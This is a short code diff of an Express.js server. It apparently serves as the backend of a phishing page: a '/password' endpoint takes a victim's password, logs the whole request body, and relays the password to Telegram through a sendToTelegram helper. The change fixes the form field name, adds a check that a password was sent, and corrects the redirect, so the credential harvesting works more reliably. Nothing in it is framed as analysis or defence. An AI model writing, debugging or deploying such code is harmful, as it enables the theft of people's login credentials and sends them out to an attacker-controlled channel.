@@ -48,13 +48,17 @@ app.post('/email', async (req, res) => {
 });
 
 app.post('/password', async (req, res) => {
-  const password = req.body.password;
+  console.log('Request body:', req.body); // Log the entire request body
+  const password = req.body.passwd; // Use 'passwd' instead of 'password'
   console.log('Password received:', password);
 
-  await sendToTelegram(`Password received: ${password}`);
-  res.redirect('index.html');
-});
+  if (!password) {
+    return res.status(400).send('Password is required');
+  }
 
+  await sendToTelegram(`Password received: ${password}`);
+  res.redirect('/index.html');
+});
 const PORT = 3000;
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
